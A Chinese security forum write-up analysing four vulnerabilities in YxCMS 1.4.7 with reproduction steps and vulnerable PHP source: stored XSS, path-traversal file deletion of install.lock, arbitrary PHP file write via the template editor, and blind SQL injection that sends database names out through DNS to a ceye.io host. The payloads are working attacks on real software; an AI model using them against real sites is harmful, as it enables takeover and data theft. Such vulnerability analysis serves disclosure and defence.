i春秋作家：F0rmat

原文来自：[YxCMS 1.4.7
最新版漏洞分析](https://bbs.ichunqiu.com/thread-45926-1-1.html?from=beef)

# 0x01前言

> 很感谢关注我专辑的表哥，我会坚持写下去的，最近会慢一点，一月四篇是正常的。

在先知看到的，大部分都是后台漏洞，部分厂商对于后台的漏洞都不认可，因为厂商觉得能进入后台这些漏洞都不是漏洞。最恐怖的是厂商否认了漏洞存在，然后偷偷的去修复。

# 0x02 安装程序

具体的安装和使用的详细可以上官网查看https://www.kancloud.cn/yongheng/yxcms

# 0x03 前台XSS

## 1.漏洞复现

打开链接http://sb.com/index.php?r=default/column/index&col=guestbook

输入payload：`<svg/onload=alert(1)>`

  
![image.png](https://image.3001.net/images/20180918/1537255055_5ba0a68faf268.png!small)然后登陆后台，查看审核![image.png](https://image.3001.net/images/20180918/1537255072_5ba0a6a0e189a.png!small)点击编辑![image.png](https://image.3001.net/images/20180918/1537255078_5ba0a6a63f3a0.png!small)  

  * ## 2.漏洞分析

  * 前台的文件源码`protected/apps/default/controller/columnController.php`
    
        public function index()
    {
        $ename=in($_GET['col']);
        if(empty($ename)) throw new Exception('栏目名不能为空~', 404);
        $sortinfo=model('sort')->find("ename='{$ename}'",'id,name,ename,path,url,type,deep,method,tplist,keywords,description,extendid');
        $path=$sortinfo['path'].','.$sortinfo['id'];
        $deep=$sortinfo['deep']+1;
        $this->col=$ename;
        switch ($sortinfo['type']) {
            case 1://文章
                $this->newslist($sortinfo,$path,$deep);
                break;
            case 2://图集
                $this->photolist($sortinfo,$path,$deep);
                break;
            case 3://单页
                $this->page($sortinfo,$path,$deep);
                break;
            case 4://应用
    
                break;
            case 5://自定义
    
                break;
            case 6://表单
                $this->extend($sortinfo,$path,$deep);
                break;
            default:
                throw new Exception('未知的栏目类型~', 404);
                break;
        }
    }   

  * 后台的文件源码`protected/apps/admin/controller/extendfieldController.php`
    
        public function mesedit()
    {
        $tableid=intval($_GET['tabid']);
        if(!$this->checkConPower('extend',$tableid)) $this->error('您没有权限管理此独立表内容~');
        $id=intval($_GET['id']);//信息id
        if(empty($tableid) || empty($id) ) $this->error('参数错误~');
        $tableinfo = model('extend')->select("id='{$tableid}' OR pid='{$tableid}'",'id,tableinfo,name,type,defvalue','pid,norder DESC');
        if(empty($tableinfo)) $this->error('自定义表不存在~');
        if (!$this->isPost()) {
           $info=model('extend')->Extfind($tableinfo[0]['tableinfo'],"id='{$id}'");
           $this->info=$info;
           $this->tableid=$tableid;
           $this->id=$id;
           $this->tableinfo=$tableinfo;
           $this->display();
        }else{
           for($i=1;$i<count($tableinfo);$i++){
            if(is_array($_POST[$tableinfo[$i]['tableinfo']]))
              $data[$tableinfo[$i]['tableinfo']]=implode(',',$_POST[$tableinfo[$i]['tableinfo']]);
            else
              $data[$tableinfo[$i]['tableinfo']]=html_in($_POST[$tableinfo[$i]['tableinfo']]);
           }
           if(model('extend')->Extup($tableinfo[0]['tableinfo'],"id='{$id}'",$data)) $this->success('修改成功~',url('extendfield/meslist',array('id'=>$tableid)));
           else $this->error('信息修改失败~');
         }
    }

中间没什么过滤，具体可以看松哥的一篇文章：<https://www.hackersb.cn/hacker/85.html>

# 0x04 任意文件删除

## 1.漏洞复现

  * 需要先登录后台，然后访问之后会显示缩略图不存在：  
Payload：<http://sb.com/index.php?r=admin/photo/delpic>  
POST：picname=../../protected/apps/install/install.lock![image.png](https://image.3001.net/images/20180918/1537255137_5ba0a6e14d2e2.png!small)

然后访问网站首页就会自动转到安装的页面http://sb.com/index.php![image.png](https://image.3001.net/images/20180918/1537255146_5ba0a6ea00da1.png!small)看到目录下的install.lock文件已经被删除了

  * ## 2.漏洞分析

  * 漏洞文件：`protected/apps/admin/controller/photoController.php`,在第355行的delpic()函数，可以看到`$picname`接收POST过来的值，然后`$path`等于文件开头定义的静态变量  
`static protected $uploadpath='';//图片上传路径`  
没有对传入的值进行任何的过滤，使用函数`file_exists()`判断一下文件是否存在就给`unlink`执行删除文件了。

    
        public function delpic()
    {
        if(empty($_POST['picname'])) $this->error('参数错误~');
        $picname=$_POST['picname'];
        $path=$this->uploadpath;
        if(file_exists($path.$picname))
          @unlink($path.$picname);
        else{echo '图片不存在~';return;} 
        if(file_exists($path.'thumb_'.$picname))
           @unlink($path.'thumb_'.$picname);
        else {echo '缩略图不存在~';return;}
        echo '原图以及缩略图删除成功~';
    }

# 0x05 任意文件写入

## 1.漏洞复现

  * 打开地址http://sb.com/index.php?r=admin/set/tpadd&Mname=default![image.png](https://image.3001.net/images/20180918/1537255193_5ba0a7197b0fd.png!small)

打开我们的文件监控软件`FolderChangesView`，输入我们的程序路径`D:\phpStudy\PHPTutorial\WWW\YXcms`![image.png](https://image.3001.net/images/20180918/1537255201_5ba0a7214fcb4.png!small)然后写shell.php文件名，写入我们的代码。![image.png](https://image.3001.net/images/20180918/1537255208_5ba0a728611a3.png!small)然后会在`\protected\apps\default\view\default`下面生成我们写入的文件。![image.png](https://image.3001.net/images/20180918/1537255215_5ba0a72fa8e7e.png!small)

  * ## 2.漏洞分析

  * 漏洞文件`protected/apps/admin/controller/setController.php`的140行，`$tpfile`接收到GET传过来的值，如果为空的话就会报非法操作。传过来的URL是`admin/set/tpadd&Mname=default`，所以`$tpfile`就是`default`。
  * 再来下是检测是否有POST的值，接受到POST过来的`filename`,用`trim`去掉两边的空格。接收到POST过来的`code`，用`stripcslashes`反转义。
  * `$filepath=$templepath.$filename.'.php'`这一句是路径和文件的拼接，然后下面检测路径是否存在。
  * 最后没有过滤任何的危险函数就传给`file_put_contents`函数，写入网站的目录。
    
        public function tpadd()
    {
       $tpfile=$_GET['Mname'];
       if(empty($tpfile)) $this->error('非法操作~');
       $templepath=BASE_PATH . $this->tpath.$tpfile.'/';
       if($this->isPost()){
         $filename=trim($_POST['filename']);
         $code=stripcslashes($_POST['code']);
         if(empty($filename)||empty($code)) $this->error('文件名和内容不能为空');
         $filepath=$templepath.$filename.'.php';
         if($this->ifillegal($filepath)) {$this->error('非法的文件路径~');exit;}
         try{
            file_put_contents($filepath, $code);
          } catch(Exception $e) {
            $this->error('模板文件创建失败！');
          } 
          $this->success('模板文件创建成功！',url('set/tplist',array('Mname'=>$tpfile)));
       }else{
         $this->tpfile=$tpfile;
         $this->display();
    
       }
    }

  

  * # 0x06 SQL注入

## 1.漏洞复现

这个盲注可以用ceye.io和python脚本跑，我之前的文章也有写到。  
<http://sb.com/index.php?r=admin/fragment/index>  
payload:`1 and if((select load_file(concat('\\\\',(select
database()),'.xxxx.ceye.io\\abc'))),1,1))--`

  * 点击删除![image.png](https://image.3001.net/images/20180918/1537255253_5ba0a7554a586.png!small)然后用burp截获数据，修改内容加上我们的payload，用原文的payload后面`+`会报错![image.png](https://image.3001.net/images/20180918/1537255263_5ba0a75fb4ce8.png!small)然后进入http://ceye.io/records/dns 查看我们的数据![image.png](https://image.3001.net/images/20180918/1537255271_5ba0a76761f60.png!small)

  * ## 2.漏洞分析

  * 查看漏洞文件`protected/apps/admin/controller/fragmentController.php`的第63行
    
        public function del()
    {
        if(!$this->isPost()){
            $id=intval($_GET['id']);
            if(empty($id)) $this->error('您没有选择~');
            if(model('fragment')->delete("id='$id'"))
            echo 1;
            else echo '删除失败~';
        }else{
            if(empty($_POST['delid'])) $this->error('您没有选择~');
            $delid=implode(',',$_POST['delid']);
            if(model('fragment')->delete('id in ('.$delid.')'))
            $this->success('删除成功',url('fragment/index'));
        }
    }

  * 我们跟`if(model('fragment')->delete("id='$id'"))`,它会先到`protected/core.php`文件里面的`model`
    
        function model($model){
    static $objArray = array();
    $className = $model . 'Model';
    if( !is_object($objArray[$className]) ){
        if( !class_exists($className) ) {
            throw new Exception(config('_APP_NAME'). '/' . $className . '.php 模型类不存在');
        }
        $objArray[$className] = new $className();
    }
    return $objArray[$className];
    }

  * 然后到`protected/apps/admin/model/fragmentModel.php`
    
        <?php
    class fragmentModel extends baseModel{
    protected $table = 'fragment';
    }

  * 继续`protected/base/model/baseModel.php`
    
        <?php
    class baseModel extends model{
     protected $prefix='';
     public function __construct( $database= 'DB',$force = false ){
        parent::__construct();
        $this->prefix=config('DB_PREFIX');
    }
    }

  * 再来到最底层的数据库操作类`protected/base/model/model.php`的第45行
    
        public function delete($condition){
    return $this->model->table($this->table, $this->ignoreTablePrefix)->where($condition)->delete();
    }

这个`delete()`是从哪里来的，我们来看第十三行的代码,创建了一个对象`cpModel`

    
        static public function connect($config, $force=false){
        static $model = NULL;
        if( $force==true || empty($model) ){
            $model = new cpModel($config);
        }
        return $model;
    }

  * 漏洞文件在`protected/include/core/cpModel.class.php`,
    
        public function delete() {
        $table = $this->options['table'];    //当前表
        $where = $this->_parseCondition();   //条件
        if ( empty($where) ) return false; //删除条件为空时，则返回false，避免数据不小心被全部删除
    
        $this->sql = "DELETE FROM $table $where";
        $query = $this->db->execute($this->sql);
        return $this->db->affectedRows();
    }

这里用到了一个方法`_parseCondition()`

    
        private function _parseCondition() {
        $condition = $this->db->parseCondition($this->options);
        $this->options['where'] = '';
        $this->options['group'] = '';
        $this->options['having'] = '';
        $this->options['order'] = '';
        $this->options['limit'] = '';
        $this->options['field'] = '*';       
        return $condition;      
    }
    }

这个函数是在`protected/include/core/db/cpMysql.class.php`的128行

    
        public function parseCondition($options) {
        $condition = "";
        if(!empty($options['where'])) {
            $condition = " WHERE ";
            if(is_string($options['where'])) {
                $condition .= $options['where'];
            } else if(is_array($options['where'])) {
                    foreach($options['where'] as $key => $value) {
                         $condition .= " `$key` = " . $this->escape($value) . " AND ";
                    }
                    $condition = substr($condition, 0,-4);  
            } else {
                $condition = "";
            }
        }
    
        if( !empty($options['group']) && is_string($options['group']) ) {
            $condition .= " GROUP BY " . $options['group'];
        }
        if( !empty($options['having']) && is_string($options['having']) ) {
            $condition .= " HAVING " .  $options['having'];
        }
        if( !empty($options['order']) && is_string($options['order']) ) {
            $condition .= " ORDER BY " .  $options['order'];
        }
        if( !empty($options['limit']) && (is_string($options['limit']) || is_numeric($options['limit'])) ) {
            $condition .= " LIMIT " .  $options['limit'];
        }
        if( empty($condition) ) return "";
        return $condition;
    }

里面有一个行数来过滤`escape`,我们找到74行的这个函数定义

    
        public function escape($value) {
        if( isset($this->_readLink) ) {
            $link = $this->_readLink;
        } elseif( isset($this->_writeLink) ) {
            $link = $this->_writeLink;
        } else {
            $link = $this->_getReadLink();
        }
    
        if( is_array($value) ) { 
           return array_map(array($this, 'escape'), $value);
        } else {
           if( get_magic_quotes_gpc() ) {
               $value = stripslashes($value);
           } 
            return  "'" . mysql_real_escape_string($value, $link) . "'";
        }
    }

不过这个函数有一句`is_array`如果是数组才会执行下面的过滤，如果不是的话就正常执行下去,没有任何sql的过滤就造成了注入漏洞。

# 0x07 参考

程序下载：<https://www.lanzous.com/i1w4bsb>  
<https://xz.aliyun.com/t/2734>  
<https://bbs.ichunqiu.com/thread-22002-1-1.html>  
[http://ceye.io](http://ceye.io/)

# 大家有任何问题可以提问，更多文章可到[i春秋论坛](https://bbs.ichunqiu.com/portal.php?from=beef)阅读哟~

